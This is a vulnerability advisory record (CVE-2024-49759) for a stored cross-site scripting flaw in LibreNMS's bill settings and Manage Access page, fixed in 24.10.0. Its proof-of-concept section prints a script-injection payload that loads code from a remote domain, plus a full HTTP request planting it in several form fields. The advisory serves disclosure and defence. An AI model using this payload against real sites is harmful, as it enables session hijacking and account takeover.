advisory_id: GHSA-888j-pjqh-fx58
datasource_id: github_osv_importer_v2/GHSA-888j-pjqh-fx58
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/11/GHSA-888j-pjqh-fx58/GHSA-888j-pjqh-fx58.json
aliases:
  - CVE-2024-49759
summary: |
  Stored XSS ('Cross-site Scripting') in librenms/includes/html/pages/edituser.inc.php
  ### Summary
  A Stored Cross-Site Scripting (XSS) vulnerability in the "Manage User Access" page allows authenticated users to inject arbitrary JavaScript through the "bill_name" parameter when creating a new bill. This vulnerability can lead to the execution of malicious code when visiting the "Bill Access" dropdown in the user's "Manage Access" page, potentially compromising user sessions and allowing unauthorized actions.

  ### Details
  When creating a new bill, an attacker can inject the following XSS payload into the "bill_name" parameter:
  ```test1'"><script/src=//15.rs>```

  Note: The payload uses the "15.rs" domain to bypass some of the length restrictions found during research by pointing to a malicious remote file. The file contains a POC XSS payload, and can contain any arbitrary JS code.

  The payload triggers in the "Bill Access" dropdown when the user's "Manage Access" page is visited. The sink responsible for this issue is:
  https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/pages/edituser.inc.php#L309

  ### PoC
  1. Create a new bill using the following payload in the "bill_name" parameter:
  ```test1'"><script/src=//15.rs>```
  2. Save the bill.
  3. Navigate to the "Manage Access" page for the user.
  4. Observe that the injected script executes in the "Bill Access" dropdown.

  Example Request:
  ```http
  POST /bill/bill_id=2/view=edit/ HTTP/1.1
  Host: <your_host>
  Content-Type: application/x-www-form-urlencoded
  Cookie: <your_cookie>

  _token=<your_token>&action=update_bill&bill_name=test1%27%22%3E%3Cscript%2Fsrc%3D%2F%2F15.rs%3E&bill_type=cdr&bill_cdr=&bill_cdr_type=Kbps&dir_95th=in&bill_quota=&bill_quota_type=MB&bill_day=1&bill_custid=test2%27%22%3E%3Cscript%2Fsrc%3D%2F%2F15.rs%3E&bill_ref=test3%27%22%3E%3Cscript%2Fsrc%3D%2F%2F15.rs%3E&bill_notes=test4%27%22%3E%3Cscript%2Fsrc%3D%2F%2F15.rs%3E&Submit=Save
  ```

  ### Impact

  This vulnerability allows authenticated users to execute arbitrary JavaScript in the context of other users' sessions when they visit the "Manage Access" page. The attacker can perform unauthorized actions or compromise user accounts by exploiting this vulnerability.
impacted_packages:
  - purl: pkg:composer/librenms/librenms
    affected_versions: vers:composer/<=24.9.1
    fixed_versions: vers:composer/24.10.0
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '7.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:L/A:L
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/11/GHSA-888j-pjqh-fx58/GHSA-888j-pjqh-fx58.json
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-79
references:
  - url: https://github.com/librenms/librenms
    reference_type:
    reference_id:
  - url: https://github.com/librenms/librenms/commit/237f4d2e818170171dfad6efad36a275cd2ba8d0
    reference_type:
    reference_id:
  - url: https://github.com/librenms/librenms/security/advisories/GHSA-888j-pjqh-fx58
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2024-49759
    reference_type:
    reference_id: CVE-2024-49759
